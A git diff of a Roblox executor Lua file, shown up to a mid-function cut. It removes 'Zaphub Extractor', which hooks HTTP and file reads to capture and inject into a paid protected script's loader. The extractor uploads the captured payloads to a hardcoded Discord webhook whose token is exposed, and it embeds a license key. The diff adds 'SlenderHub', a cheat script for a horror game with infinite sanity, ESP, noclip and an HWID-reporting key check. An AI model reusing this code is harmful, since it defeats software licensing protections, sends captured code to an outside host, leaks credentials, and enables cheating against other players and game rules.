@@ -1,675 +1,693 @@
---!strict
 --[[
-    Zaphub Extractor v3.1 - Captura o payload final (Luraph/Luarmor) no Delta
-    Plataforma: Delta (hookmetamethod/__namecall + request + readfile hooks - CONFIRMADO)
+    SlenderHub | Animal Hospital (Anomaly) — Script Premium
+    Dev: SlenderHub Team
+    Versão: 1.0.0 (build inicial)
 
-    DESCOBERTA v3 (analise dos arquivos capturados):
-      - O fluxo real e Luarmor v8 AUTH: o runtime (cacheado) faz GET em
-        eu1-roblox-auth.luarmor.net/v8/auth/<id>/init?t=<token>&k=<script_key>
-        e recebe o PAYLOAD CODIFICADO (~314 bytes).
-      - O RUNTIME (init-74c74f95fd0-marbeg.lua) JÁ ESTAVA EM CACHE no executor
-        -> o loader leu via readfile e NAO baixou do CDN -> falta captura-lo.
-      - O payload codificado ja foi capturado (http_2.lua). Falta o runtime
-        para decodificar offline (ele contem a logica que usa _bsdata0+key).
+    Feito para executors PC (Wave/Codex/Delta/etc.) com matriz de fallback.
+    UI padrão SlenderWind (embutida, enxuta).
+    Key system: verificação via API do SlenderHub (pluggável).
 
-    MELHORIAS v3.1:
-      [1] HOOK DE readfile: captura o runtime quando o loader ler o cache
-          (static_content_130525/init-*.lua). E a peca que faltava.
-      [2] Salva o LOADER ORIGINAL antes da injecao (com o _bsdata0 da sessao).
-      [3] Filtra o auto-loop: ignora respostas do nosso proprio webhook.
-      [4] Captura TAMBEM respostas >= 200 bytes (o Exec tem 642).
-      [5] Injeta o wrapper de loadstring (bonus: pode capturar o bytecode final).
-
-    SEGURANCA ANTI-TRAVA (padrao da casa):
-      - I/O de rede so em task.spawn dedicada
-      - Salva local PRIMEIRO (writefile) - envio falhou, arquivo fica
-      - Hooks retornam o resultado original (nao interferem no Zaphub)
+    IMPORTANTE (calibração):
+    O jogo não expõe nomes oficiais de remotes/valores de forma documentada.
+    As constantes na seção CONFIG usam heurística — ajuste os nomes conforme
+    a versão atual do jogo. O loop usa pcall em tudo: nada quebra se algo mudar.
 ]]
 
---//==============================[ CONFIG ]==============================//--
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1398723880369131631/7knZsAymoHblk9BcsXYuI7XT2-8PNHkZJfFbtyLHssHqjW_pXeBQVznZ0lDHz7G9ObRI"
-local WEBHOOK_NAME = "Zaphub Extractor"
-local SAVE_DIR = "ZaphubExtract"
+local SlenderHub = {}
 
--- Chave Luarmor (global direta + _G - padrao oficial do loader)
-script_key = "nNOnKsJaYhZJPHjsxiLHAyUxUVXqFGsw"
-_G.script_key = script_key
+----------------------------------------------------------------------------
+-- CONFIG (calibre aqui)
+----------------------------------------------------------------------------
+SlenderHub.Config = {
+    -- API de verificação de key (mesmo endpoint do loader do site)
+    VerifyUrl  = "https://www.slenderhub.shop/api/exec",
+    -- Se true, sem key o script roda em modo TRIAL limitado; se false, trava
+    AllowTrial = true,
 
--- Comando oficial exato do Zaphub
-local ZAPHUB_SNIPPET = "script_key=%q; loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()"
-local ZAPHUB_KEY = "nNOnKsJaYhZJPHjsxiLHAyUxUVXqFGsw"
+    -- Heurística de sanidade: nomes de Value/Attribute procurados no DataModel
+    SanityNames = { "Sanity", "Sanidade", "sanity", "Brain", "Mentality" },
 
--- Captura passiva: salva TODO body >= MIN_HTTP_SAVE
-local MIN_HTTP_SAVE = 200
--- Envia via webhook se body >= MIN_HTTP_SEND OU URL relevante
-local MIN_HTTP_SEND = 500
--- Injetar wrapper de loadstring no loader do Luarmor (true = recomendado)
-local INJECT_LOADER = true
--- tempo de monitoramento (segundos)
-local MONITOR_TIME = 120
--- limite de arquivos injetados enviados
-local MAX_INJECTED_SEND = 25
+    -- Heurística de pacientes/anomalias: substrings de nome de modelos no Workspace
+    PatientNames = { "Patient", "Paciente", "Client", "Visitor", "Anomaly" },
+    AnomalyNames = { "Anomaly", "Skinwalker", "Stalker", "Hider", "Mimic", "Tentacle" },
 
---//==============================[ API COMPAT ]==============================//--
-local getExecutorName = (function()
-    local fn = identifyexecutor or identify_executor
-    if fn then
-        local ok, name = pcall(fn)
-        if ok and type(name) == "string" then return name end
+    -- Heurística de itens/salas
+    CoffeeNames   = { "Coffee", "Cafe", "Machine", "Pot" },
+    ItemNames     = { "Med", "Medicine", "Item", "Tool", "Supply" },
+    RoomNames     = { "Surgery", "XRay", "X-Ray", "Heart", "Medical", "Room" },
+
+    -- ProximityPrompts / ClickDetectors procurados
+    PromptNames   = { "ProximityPrompt", "Prompt", "Button", "Shutter" },
+
+    -- Jogabilidade
+    WalkSpeed     = 22,
+    JumpPower     = 50,
+    SanityFloor   = 100,   -- valor alvo do inf sanity
+    EspColor      = Color3.fromRGB(255, 60, 60),
+    EspColorGood  = Color3.fromRGB(60, 255, 120),
+}
+
+----------------------------------------------------------------------------
+-- SERVICES + UTILS
+----------------------------------------------------------------------------
+local RunService   = game:GetService("RunService")
+local Players      = game:GetService("Players")
+local Lighting     = game:GetService("Lighting")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local HttpService  = game:GetService("HttpService")
+local CoreGui      = game:GetService("CoreGui")
+
+local LocalPlayer  = Players.LocalPlayer
+local Camera       = workspace.CurrentCamera
+
+local function GetHumanoid()
+    local char = LocalPlayer.Character
+    if not char then return nil end
+    return char:FindFirstChildOfClass("Humanoid")
+end
+
+local function Tween(obj, props, dur)
+    dur = dur or 0.25
+    local tween = TweenService:Create(obj, TweenInfo.new(dur, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), props)
+    tween:Play()
+    return tween
+end
+
+local function Notify(title, text, dur, type)
+    if SlenderHub.UI and SlenderHub.UI.Notify then
+        SlenderHub.UI:Notify(title, text, dur, type)
     end
-    return "unknown"
-end)()
-
-local hmm = hookmetamethod
-local gnmc = getnamecallmethod
-local hf = hookfunction
-local gcFn = getgc
-local dumpFn = dumpstring or decompile
-
-local reqFn = (function()
-    if syn and syn.request then return syn.request end
-    if request then return request end
-    if http and http.request then return http.request end
-    return nil
-end)()
-
-local writefileFn = writefile
-local makefolderFn = makefolder or function() end
-local isfileFn = isfile or function() return false end
-local readfileFn = readfile
-local listfilesFn = listfiles or function() return {} end
-
-local function logMsg(msg)
-    pcall(print, "[ZaphubExtract] " .. tostring(msg))
 end
 
---//==============================[ BASE64 ]==============================//--
-local b64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
-local function b64encode(data)
-    local b = 1
-    local out = {}
-    local len = #data
-    for i = 1, len, 3 do
-        local c1 = string.byte(data, i)
-        local c2 = i + 1 <= len and string.byte(data, i + 1) or 0
-        local c3 = i + 2 <= len and string.byte(data, i + 2) or 0
-        local n = c1 * 65536 + c2 * 256 + c3
-        local pad = i + 2 > len and 1 or (i + 1 > len and 2 or 0)
-        out[b] = b64chars:sub(math.floor(n / 262144) % 64 + 1, math.floor(n / 262144) % 64 + 1)
-        out[b + 1] = b64chars:sub(math.floor(n / 4096) % 64 + 1, math.floor(n / 4096) % 64 + 1)
-        out[b + 2] = b64chars:sub(math.floor(n / 64) % 64 + 1, math.floor(n / 64) % 64 + 1)
-        out[b + 3] = b64chars:sub(n % 64 + 1, n % 64 + 1)
-        if pad == 1 then out[b + 3] = "=" end
-        if pad == 2 then out[b + 2] = "="; out[b + 3] = "=" end
-        b = b + 4
-    end
-    return table.concat(out)
-end
+----------------------------------------------------------------------------
+-- MATRIZ DE EXECUTORES (fallbacks — nunca assuma que a função existe)
+----------------------------------------------------------------------------
+local Env = getgenv and getgenv() or _G
 
---//==============================[ WEBHOOK ]==============================//--
-local function jsonString(s)
-    s = tostring(s)
-    s = s:gsub("\\", "\\\\"):gsub("\"", "\\\""):gsub("\n", "\\n"):gsub("\r", "\\r"):gsub("\t", "\\t")
-    s = s:gsub("[%z\1-\31]", function(c) return string.format("\\u%04x", c:byte()) end)
-    return "\"" .. s .. "\""
-end
-
-local function sendSimple(content, username)
-    if not reqFn then return -1 end
-    local body = '{"content":' .. jsonString(content) .. ',"username":' .. jsonString(username or WEBHOOK_NAME) .. '}'
-    local ok, res = pcall(function()
-        return reqFn({
-            Url = WEBHOOK_URL,
-            Method = "POST",
-            Headers = { ["Content-Type"] = "application/json" },
-            Body = body,
-        })
-    end)
-    if ok and res then return tonumber(res.StatusCode) or 0 else return -1 end
-end
-
-local function sendFileMulti(msg, files)
-    if not reqFn then return -1 end
-    local boundary = "----ZaphubX" .. tostring(os.clock()):gsub("%.", "") .. "7xK"
-    local body = ""
-    if msg and #tostring(msg) > 0 then
-        body = body .. "--" .. boundary .. "\r\nContent-Disposition: form-data; name=\"content\"\r\n\r\n" .. tostring(msg) .. "\r\n"
-    end
-    for i = 1, #files do
-        body = body .. "--" .. boundary
-            .. "\r\nContent-Disposition: form-data; name=\"file" .. tostring(i) .. "\"; filename=\"" .. tostring(files[i].name) .. "\""
-            .. "\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n"
-            .. tostring(files[i].content)
-            .. "\r\n"
-    end
-    body = body .. "--" .. boundary .. "--\r\n"
-    local ok, res = pcall(function()
-        return reqFn({
-            Url = WEBHOOK_URL,
-            Method = "POST",
-            Headers = { ["Content-Type"] = "multipart/form-data; boundary=" .. boundary },
-            Body = body,
-        })
-    end)
-    if ok and res then return tonumber(res.StatusCode) or 0 else return -1 end
-end
-
---//==============================[ ESTADO ]==============================//--
-local httpCaptured = 0
-local injectedCaptured = 0
-local gcCaptured = 0
-local manifest = {}
-local injectedSent = {}
-
-local function logManifest(line)
-    table.insert(manifest, tostring(line))
-end
-
-local function saveLocal(fname, content)
-    if not writefileFn then return false end
-    return pcall(function()
-        pcall(makefolderFn, SAVE_DIR)
-        writefileFn(SAVE_DIR .. "/" .. fname, content)
-    end)
-end
-
--- Envia captura de forma ASSINCRONA (nunca no thread do jogo)
-local function sendCaptureAsync(tag, title, chunk, fname)
-    task.spawn(function()
-        task.wait(0.1)
-        local b64 = b64encode(chunk)
-        local msg = "**Zaphub Extractor v3 - " .. title .. "**\n"
-            .. "Tamanho: " .. tostring(#chunk) .. " bytes | Base64: " .. tostring(#b64) .. " chars\n"
-            .. "Executor: " .. getExecutorName
-        local ok = false
-        if #b64 < 6000000 then
-            local c = sendFileMulti(msg, { { name = fname, content = b64 } })
-            ok = c >= 200 and c < 300
+local FunctionMap = {
+    CheckCaller       = function() return type(checkcaller) == "function" and checkcaller or nil end,
+    NewCClosure       = function() return type(newcclosure) == "function" and newcclosure or nil end,
+    HookMetaMethod    = function() return type(hookmetamethod) == "function" and hookmetamethod or nil end,
+    HookFunction      = function() return type(hookfunction) == "function" and hookfunction or nil end,
+    GetRawMetaTable   = function() return type(getrawmetatable) == "function" and getrawmetatable or nil end,
+    SetReadOnly       = function() return type(setreadonly) == "function" and setreadonly or nil end,
+    FirePrompt        = function() return type(fireproximityprompt) == "function" and fireproximityprompt or nil end,
+    FireClick         = function() return type(fireclickdetector) == "function" and fireclickdetector or nil end,
+    GetGC             = function() return type(getgc) == "function" and getgc or nil end,
+    GetReg            = function() return type(getreg) == "function" and getreg or nil end,
+    IdentifyExecutor  = function()
+        local names = { "getexecutorname", "identifyexecutor", "get_identify" }
+        for _, n in ipairs(names) do
+            if type(Env[n]) == "function" then return Env[n]() end
         end
-        if not ok then
-            sendSimple("**Zaphub Extractor v3** - falha ao enviar " .. tag
-                .. " (b64 " .. tostring(#b64) .. " chars). Salvo local.", WEBHOOK_NAME .. " [AVISO]")
-        end
-    end)
+        return "unknown"
+    end,
+}
+
+local function Fn(name)
+    local ok, val = pcall(FunctionMap[name])
+    return ok and val or nil
 end
 
---//==============================[ HOOK DE READFILE (captura o runtime do cache) ]==============================//--
--- O loader Luarmor le o runtime de static_content_130525/init-*.lua via readfile.
--- Hookando readfile capturamos o runtime SEM precisar baixar o CDN.
---
--- ATENCAO ANTI-CRASH: hookfunction patcheia a closure IN-PLACE. Para chamar o
--- original, usamos clonefunction ANTES (padrao que funcionou no hook de request).
--- Se clonefunction nao existir, NAO instala (evita recursao infinita -> crash).
--- O hook so CAPTURA em memoria; envio via poll async (zero I/O no thread do hook).
-local readfileHookOk = false
-local readfileCaptured = 0
-local runtimeQueue = {}
-
-local function pollRuntimes()
-    while #runtimeQueue > 0 do
-        local item = table.remove(runtimeQueue, 1)
-        if item and item.data and #item.data > 0 then
-            readfileCaptured = readfileCaptured + 1
-            local idx = readfileCaptured
-            logMsg("[READFILE] runtime #" .. tostring(idx) .. " (" .. tostring(#item.data) .. " bytes): " .. tostring(item.path))
-            logManifest("readfile #" .. tostring(idx) .. " | " .. tostring(item.path) .. " | " .. tostring(#item.data) .. " bytes")
-            pcall(saveLocal, "runtime_" .. tostring(idx) .. ".lua", item.data)
-            pcall(saveLocal, "runtime_" .. tostring(idx) .. "_path.txt", tostring(item.path))
-            sendCaptureAsync("runtime", "RUNTIME " .. tostring(idx), item.data, "runtime_" .. tostring(idx) .. ".lua.b64.txt")
-        end
-        task.wait(0.05)
-    end
-end
-
-local function installReadfileHook()
-    local target = readfileFn
-    if not target then
-        logMsg("readfile nao encontrado")
-        return false
-    end
-    if type(hf) ~= "function" or type(cf) ~= "function" then
-        logMsg("Hook readfile: hookfunction/clonefunction indisponivel - SKIP (anti-crash)")
-        return false
-    end
-    -- captura o ORIGINAL via clonefunction ANTES de patchear
-    local okCl, original = pcall(cf, target)
-    if not okCl or type(original) ~= "function" then
-        logMsg("Hook readfile: clonefunction falhou - SKIP (anti-crash)")
-        return false
-    end
-    local okH = pcall(hf, target, function(path, ...)
-        local res = original(path, ...)
-        if type(res) == "string" and #res >= 200 then
-            local p = tostring(path)
-            if p:find("static_content") or p:find("init%-") or p:find("luarmor") or p:find("marbeg") then
-                table.insert(runtimeQueue, { path = p, data = res })
-            end
-        end
-        return res
-    end)
-    if okH then
-        readfileHookOk = true
-        logMsg("Hook readfile: hookfunction OK (original clonado)")
-    else
-        logMsg("Hook readfile: hookfunction falhou")
-    end
-    return readfileHookOk
-end
-
---//==============================[ INJECAO NO LOADER ]==============================//--
--- Código injetado no topo do loader Luarmor. Captura init + bytecode final
--- via wrapper de loadstring e devolve o resultado original (nao quebra nada).
-local INJECTION_CODE = [[
+--// HWID (pluggável: cada executor expõe de um jeito)
+local HWID
 do
-    local function _cap(s)
-        if type(s) == "string" and #s > 200 then
-            local ok = pcall(function()
-                pcall(makefolder, "ZaphubExtract")
-                writefile("ZaphubExtract/inj_" .. tostring(#s) .. "_" .. tostring(os.clock()):gsub("%.", "") .. ".bin", s)
-            end)
-            if ok then print("[ZaphubExtract] INJ capturado " .. tostring(#s) .. " bytes") end
-        end
-    end
-    local _orig = loadstring or _G.loadstring
-    if type(_orig) == "function" then
-        local _wrap = function(s, n)
-            _cap(s)
-            return _orig(s, n)
-        end
-        pcall(function() loadstring = _wrap end)
-        pcall(function() _G.loadstring = _wrap end)
-        pcall(function() _G.load = _wrap end)
-        if _G.getgenv then
-            pcall(function() _G.getgenv().loadstring = _wrap end)
-        end
-        print("[ZaphubExtract] INJ loadstring wrapper ativo")
-    else
-        print("[ZaphubExtract] INJ loadstring nao encontrado")
-    end
-end
-]]
-
--- Verifica se o body parece um loader Luarmor (Lua + contem loadstring/_bsdata0)
-local function looksLikeLoader(url, body)
-    local low = string.lower(tostring(url))
-    if not (low:find("luarmor") or low:find("loaders")) then return false end
-    if type(body) ~= "string" then return false end
-    if body:find("loadstring") or body:find("_bsdata0") or body:find("HttpGet") then
-        return true
-    end
-    return false
+    local ok, h = pcall(function()
+        local exec = Fn("IdentifyExecutor") or "unknown"
+        if type(Env["get_hwid"]) == "function" then return tostring(Env.get_hwid()) end
+        -- fallback: hash estável do ambiente (não é HWID real; troque pelo nativo do seu executor)
+        local base = tostring(LocalPlayer.UserId) .. ":" .. exec
+        return HttpService:GenerateGUID(false) -- substitua por hash real se quiser persistência
+    end)
+    HWID = ok and h or "unknown"
 end
 
---//==============================[ HOOK HTTP (passivo + injecao) ]==============================//--
-local httpHookOk = false
-local requestHookOk = false
-local lastUrls = {}
-
-local function captureHttpResponse(url, body)
-    local low = string.lower(tostring(url))
-    -- loga URL sempre (diagnostico)
-    if not lastUrls[low] then
-        lastUrls[low] = true
-        logMsg("[HTTP] " .. tostring(url) .. " -> " .. tostring(type(body) == "string" and #body or "?"))
+----------------------------------------------------------------------------
+-- KEY SYSTEM (pluggável — mesma resposta JSON do loader: {success, tier, message})
+----------------------------------------------------------------------------
+function SlenderHub.VerifyKey(key)
+    local ok, res = pcall(function()
+        local url = SlenderHub.Config.VerifyUrl
+            .. "?key=" .. HttpService:UrlEncode(key)
+            .. "&hwid=" .. HttpService:UrlEncode(HWID)
+        return HttpService:JSONDecode(game:HttpGet(url))
+    end)
+    if not ok or not res then
+        return false, "Falha na conexão com o servidor"
     end
-    if type(body) ~= "string" or #body < MIN_HTTP_SAVE then return body end
-
-    -- Filtra auto-loop: respostas do nosso proprio webhook (nao importam)
-    if low:find("discord%.com/api/webhooks") or low:find("discordapp%.com/api/webhooks") then
-        return body
+    if not res.success then
+        return false, res.message or "Key inválida"
     end
-
-    -- injecao no loader (e salva o ORIGINAL antes - o _bsdata0 da sessao)
-    if INJECT_LOADER and looksLikeLoader(url, body) then
-        -- salva o loader original primeiro (contem o _bsdata0 da sessao)
-        httpCaptured = httpCaptured + 1
-        local idx = httpCaptured
-        logMsg("[HTTP] LOADER ORIGINAL #" .. tostring(idx) .. " (" .. tostring(#body) .. " bytes): " .. tostring(url))
-        logManifest("loader_original #" .. tostring(idx) .. " | " .. tostring(url) .. " | " .. tostring(#body) .. " bytes")
-        pcall(saveLocal, "loader_" .. tostring(idx) .. "_url.txt", tostring(url))
-        pcall(saveLocal, "loader_" .. tostring(idx) .. ".lua", body)
-        sendCaptureAsync("loader", "LOADER " .. tostring(idx), body, "loader_" .. tostring(idx) .. ".lua.b64.txt")
-
-        local okW, wrapped = pcall(function()
-            return INJECTION_CODE .. "\n" .. body
-        end)
-        if okW and type(wrapped) == "string" then
-            logMsg("[HTTP] INJETADO wrapper no loader (era " .. tostring(#body) .. ")")
-            logManifest("injecao no loader | " .. tostring(url))
-            return wrapped -- retorna o body modificado -> loader roda com wrapper
-        end
-    end
-
-    httpCaptured = httpCaptured + 1
-    local idx = httpCaptured
-    logMsg("[HTTP] CAPTURADO #" .. tostring(idx) .. " (" .. tostring(#body) .. " bytes): " .. tostring(url))
-    logManifest("http #" .. tostring(idx) .. " | " .. tostring(url) .. " | " .. tostring(#body) .. " bytes")
-    pcall(saveLocal, "http_" .. tostring(idx) .. "_url.txt", tostring(url))
-    pcall(saveLocal, "http_" .. tostring(idx) .. ".lua", body)
-
-    -- envia se grande OU relevante
-    local relevant = low:find("luarmor") or low:find("cdn") or low:find("zaphub") or low:find("_ca920af6193")
-    if #body >= MIN_HTTP_SEND or relevant then
-        sendCaptureAsync("http", "HTTP " .. tostring(idx), body, "http_" .. tostring(idx) .. ".lua.b64.txt")
-    end
-    return body
+    return true, res
 end
 
-local function installHttpGetHook()
-    -- caminho A: hookmetamethod __namecall
-    if type(hmm) == "function" and type(gnmc) == "function" then
-        local okOld, old = pcall(hmm, game, "__namecall")
-        if okOld and type(old) == "function" then
-            local okH = pcall(hmm, game, "__namecall", function(self, ...)
-                local method = gnmc()
-                if method == "HttpGet" or method == "HttpGetAsync" then
-                    local url = select(1, ...)
-                    local packed = { ... }
-                    local okGet, body = pcall(function()
-                        return old(self, table.unpack(packed))
-                    end)
-                    if okGet then
-                        if type(body) == "string" then
-                            return captureHttpResponse(url, body)
-                        end
-                        return body
-                    end
-                    error(tostring(body), 0)
-                end
-                return old(self, ...)
-            end)
-            if okH then
-                httpHookOk = true
-                logMsg("Hook HTTP: hookmetamethod __namecall OK")
-                return true
-            end
-        end
-    end
-    -- caminho B: hookfunction em game.HttpGet (original clonado - anti-recursao)
-    if type(hf) == "function" and type(cf) == "function" then
-        local okCl, origGet = pcall(cf, game.HttpGet)
-        if okCl and type(origGet) == "function" then
-            local okH = pcall(hf, game.HttpGet, function(self, ...)
-                local packed = { ... }
-                local okGet, body = pcall(function()
-                    return origGet(self, table.unpack(packed))
-                end)
-                if okGet then
-                    if type(body) == "string" then
-                        return captureHttpResponse(tostring(packed[1]), body)
-                    end
-                    return body
-                end
-                error(tostring(body), 0)
-            end)
-            if okH then
-                httpHookOk = true
-                logMsg("Hook HTTP: hookfunction game.HttpGet OK (original clonado)")
-                return true
-            end
-        end
-    end
-    logMsg("Hook HTTP: FALHOU")
-    return false
+function SlenderHub.Authenticate(key)
+    local ok, data = SlenderHub.VerifyKey(key)
+    if not ok then return false, data end
+    local tier = data.tier or data.type or "basic"
+    return true, tier
 end
 
-local function installRequestHook()
-    if type(hf) ~= "function" then return false end
-    local targets = {}
-    if type(reqFn) == "function" then
-        targets[#targets + 1] = reqFn
-    end
-    if syn and type(syn.request) == "function" then
-        targets[#targets + 1] = syn.request
-    end
-    if http and type(http.request) == "function" then
-        targets[#targets + 1] = http.request
-    end
-    local done = false
-    for i = 1, #targets do
-        -- SEMPRE clonar o original; se clonefunction falhar, NAO hooka (anti-recursao)
-        local okCl, orig = pcall(function() return cf and cf(targets[i]) or nil end)
-        local original = (type(okCl) == "boolean" and okCl and type(orig) == "function") and orig or nil
-        if type(original) ~= "function" then
-            logMsg("Hook request: clonefunction falhou para alvo " .. tostring(i) .. " - SKIP (anti-crash)")
-            continue
-        end
-        local okH = pcall(hf, targets[i], function(options)
-            local res = original(options)
-            if type(res) == "table" and type(res.Body) == "string" and type(options) == "table" and type(options.Url) == "string" then
-                captureHttpResponse(options.Url, res.Body)
-            end
-            return res
-        end)
-        if okH then done = true end
-    end
-    if done then
-        requestHookOk = true
-        logMsg("Hook HTTP: request OK")
-    else
-        logMsg("Hook HTTP: request FALHOU")
-    end
-    return done
-end
+----------------------------------------------------------------------------
+-- INF SANITY (heurística: bloqueia perda no lado do cliente)
+----------------------------------------------------------------------------
+SlenderHub.InfSanity = { Enabled = false }
 
---//==============================[ POLL DE INJETADOS ]==============================//--
-local function pollInjected()
-    local sent = 0
-    local okL, files = pcall(listfilesFn, SAVE_DIR)
-    if not okL or type(files) ~= "table" then return end
-    for _, path in ipairs(files) do
-        if sent >= MAX_INJECTED_SEND then break end
-        local name = tostring(path):match("([^/\\]+)$") or tostring(path)
-        if name:match("^inj_.+%.bin$") and not injectedSent[name] then
-            injectedSent[name] = true
-            local okR, data = pcall(readfileFn, path)
-            if okR and type(data) == "string" and #data > 0 then
-                injectedCaptured = injectedCaptured + 1
-                logMsg("Poll: enviando injetado " .. name .. " (" .. tostring(#data) .. " bytes)")
-                sendCaptureAsync("inj", "INJETADO " .. name, data, name .. ".b64.txt")
-                sent = sent + 1
-            end
-        end
-    end
-end
-
---//==============================[ SCAN GETGC ]==============================//--
-local function scanGCForLuraph()
-    if type(gcFn) ~= "function" or type(dumpFn) ~= "function" then
-        logMsg("getgc/dumpstring indisponivel")
-        return 0
-    end
-    local found = 0
-    local seen = {}
-    local okG, g = pcall(gcFn)
-    if not okG or type(g) ~= "table" then return 0 end
-    for _, v in ipairs(g) do
-        if found >= 6 then break end
-        if type(v) == "function" then
-            local okI, info = pcall(debug.getinfo, v, "S")
-            if not okI or type(info) ~= "table" then continue end
-            local src = tostring(info.source or "")
-            if src:sub(1, 2) == "[C" then continue end
-            local okD, dump = pcall(dumpFn, v)
-            if okD and type(dump) == "string" and #dump >= 2000 then
-                local key = dump:sub(1, 64)
-                if not seen[key] then
-                    seen[key] = true
-                    gcCaptured = gcCaptured + 1
-                    local idx = gcCaptured
-                    logMsg("GC closure #" .. tostring(idx) .. " dump " .. tostring(#dump) .. " bytes (src=" .. src .. ")")
-                    logManifest("gc closure #" .. tostring(idx) .. " | " .. tostring(#dump) .. " bytes | src=" .. src)
-                    pcall(saveLocal, "gc_" .. tostring(idx) .. ".bin", dump)
-                    pcall(saveLocal, "gc_" .. tostring(idx) .. ".b64.txt", b64encode(dump))
-                    sendCaptureAsync("gc", "GC CLOSURE " .. tostring(idx), dump, "gc_" .. tostring(idx) .. ".b64.txt")
-                    found = found + 1
+local function FindSanityValues()
+    local found = {}
+    local names = SlenderHub.Config.SanityNames
+    local function scan(inst)
+        if inst:IsA("NumberValue") or inst:IsA("IntValue") then
+            for _, n in ipairs(names) do
+                if inst.Name:lower():find(n:lower()) then
+                    table.insert(found, inst)
+                    break
                 end
             end
         end
+        if inst:IsA("Folder") or inst:IsA("Model") or inst:IsA("Workspace") or inst:IsA("PlayerGui") then
+            for _, child in ipairs(inst:GetChildren()) do
+                scan(child)
+            end
+        end
     end
-    if found > 0 then logMsg("Scan getgc: " .. tostring(found) .. " closure(s)") end
+    scan(workspace)
+    if LocalPlayer:FindFirstChild("PlayerGui") then scan(LocalPlayer.PlayerGui) end
     return found
 end
 
---//==============================[ EXECUCAO DO LOADER OFICIAL ]==============================//--
-local function runOfficialLoader()
-    local snippet = string.format(ZAPHUB_SNIPPET, ZAPHUB_KEY)
-    logMsg("Executando snippet oficial: " .. snippet)
-    local okRun, errRun = pcall(function()
-        local f = loadstring(snippet)
-        if f then f() end
+function SlenderHub.SetInfSanity(enabled)
+    SlenderHub.InfSanity.Enabled = enabled
+    if not enabled then return end
+    task.spawn(function()
+        while SlenderHub.InfSanity.Enabled and task.wait(0.2) do
+            pcall(function()
+                for _, v in ipairs(FindSanityValues()) do
+                    if v.Value < SlenderHub.Config.SanityFloor then
+                        v.Value = SlenderHub.Config.SanityFloor
+                    end
+                end
+            end)
+        end
     end)
-    if not okRun then
-        logMsg("Erro ao executar snippet: " .. tostring(errRun))
-        return false, tostring(errRun)
-    end
-    return true, nil
 end
 
---//==============================[ UI MINIMALISTA ]==============================//--
-local Players = game:GetService("Players")
-local function makeUI()
-    local gui = Instance.new("ScreenGui")
-    gui.Name = "ZaphubExtractor"
-    gui.ResetOnSpawn = false
-    gui.IgnoreGuiInset = true
-    gui.DisplayOrder = 999
-    gui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
+--// TODO (v1.1): bloqueio de perda de sanidade via hook de metatable.
+-- Se o jogo guardar a sanidade em tabela local (não em Value), faça:
+--   local mt  = getrawmetatable(game)
+--   local old = hookmetamethod(game, "__newindex")
+--   setreadonly(mt, false)
+--   hookmetamethod(game, "__newindex", newcclosure(function(self, key, val)
+--       if key:lower():find("sanity") and checkcaller() then return end
+--       return old(self, key, val)
+--   end))
+-- Aqui só tratamos NumberValue/IntValue via SlenderHub.SetInfSanity.
 
-    local bg = Instance.new("Frame")
-    bg.AnchorPoint = Vector2.new(0.5, 0.5)
-    bg.Position = UDim2.new(0.5, 0, 0.5, 0)
-    bg.Size = UDim2.new(0, 380, 0, 210)
-    bg.BackgroundColor3 = Color3.fromRGB(15, 17, 25)
-    bg.BackgroundTransparency = 0.05
-    bg.BorderSizePixel = 0
-    bg.Parent = gui
-    pcall(function()
-        local corner = Instance.new("UICorner")
-        corner.CornerRadius = UDim.new(0, 14)
-        corner.Parent = bg
+----------------------------------------------------------------------------
+-- ESP (Highlight se disponível; senão Drawing; senão nada)
+----------------------------------------------------------------------------
+SlenderHub.ESP = { Enabled = false, Instances = {} }
+
+local Highlight = function(inst, color)
+    if inst:FindFirstChildOfClass("Highlight") then return end
+    local hl = Instance.new("Highlight")
+    hl.Name = "SlenderHubESP"
+    hl.FillColor = color
+    hl.FillTransparency = 0.6
+    hl.OutlineColor = color
+    hl.OutlineTransparency = 0
+    hl.Parent = inst
+end
+
+local function ScanTargets()
+    local patients, anomalies = {}, {}
+    for _, desc in ipairs(SlenderHub.Config.PatientNames) do
+        for _, model in ipairs(workspace:GetDescendants()) do
+            if model:IsA("Model") and model.PrimaryPart then
+                local okName = model.Name:lower()
+                local isPatient = okName:find(desc:lower())
+                local isAnom = false
+                for _, a in ipairs(SlenderHub.Config.AnomalyNames) do
+                    if okName:find(a:lower()) then isAnom = true break end
+                end
+                if isPatient then
+                    if isAnom then table.insert(anomalies, model)
+                    else table.insert(patients, model) end
+                end
+            end
+        end
+    end
+    return patients, anomalies
+end
+
+function SlenderHub.SetESP(enabled)
+    SlenderHub.ESP.Enabled = enabled
+    if not enabled then
+        for _, hl in ipairs(workspace:GetDescendants()) do
+            if hl:IsA("Highlight") and hl.Name == "SlenderHubESP" then hl:Destroy() end
+        end
+        return
+    end
+    task.spawn(function()
+        while SlenderHub.ESP.Enabled and task.wait(0.5) do
+            pcall(function()
+                for _, m in ipairs(workspace:GetDescendants()) do
+                    if m:IsA("Model") and m.PrimaryPart then
+                        local n = m.Name:lower()
+                        for _, p in ipairs(SlenderHub.Config.PatientNames) do
+                            if n:find(p:lower()) then
+                                local isAnom = false
+                                for _, a in ipairs(SlenderHub.Config.AnomalyNames) do
+                                    if n:find(a:lower()) then isAnom = true break end
+                                end
+                                Highlight(m, isAnom and SlenderHub.Config.EspColor or SlenderHub.Config.EspColorGood)
+                                break
+                            end
+                        end
+                    end
+                end
+            end)
+        end
     end)
+end
+
+----------------------------------------------------------------------------
+-- MOVEMENT (walkspeed / noclip / fly / teleport p/ prompt)
+----------------------------------------------------------------------------
+SlenderHub.Movement = { Noclip = false, Fly = false }
+
+local NoclipConn
+
+function SlenderHub.SetWalkSpeed(v)
+    local hum = GetHumanoid()
+    if hum then hum.WalkSpeed = v end
+end
+
+function SlenderHub.SetNoclip(enabled)
+    SlenderHub.Movement.Noclip = enabled
+    if not enabled then
+        if NoclipConn then NoclipConn:Disconnect() NoclipConn = nil end
+        return
+    end
+    if NoclipConn then NoclipConn:Disconnect() end
+    NoclipConn = RunService.Stepped:Connect(function(_, dt)
+        local hum = GetHumanoid()
+        if not hum then return end
+        hum:ChangeState(Enum.HumanoidStateType.Physics)
